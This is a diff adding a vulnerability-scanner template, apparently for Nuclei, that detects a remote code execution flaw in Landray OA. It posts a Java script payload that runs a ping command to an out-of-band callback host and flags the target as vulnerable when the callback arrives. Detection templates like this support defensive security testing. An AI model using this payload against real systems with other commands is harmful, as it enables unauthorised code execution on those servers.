@@ -1,0 +1,29 @@
+id: landray-oa-treexml-rce
+
+info:
+  name: Landray OA treexml.tmpl Script RCE
+  author: ritikchaddha
+  severity: high
+  reference:
+    - https://github.com/tangxiaofeng7
+  tags: landray,oa,rce
+
+requests:
+  - method: POST
+    path:
+      - '{{BaseURL}}/data/sys-common/treexml.tmpl'
+
+    body: |
+        s_bean=ruleFormulaValidate&script=try {String cmd = "ping {{interactsh-url}}";Process child = Runtime.getRuntime().exec(cmd);} catch (IOException e) {System.err.println(e);}
+
+    headers:
+      Pragma: no-cache
+      Content-Type: application/x-www-form-urlencoded
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        name: http
+        words:
+          - "dns"
+          - "http"
